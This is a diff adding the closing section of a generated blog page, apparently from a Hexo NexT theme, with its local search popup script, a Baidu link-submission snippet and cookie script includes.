+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
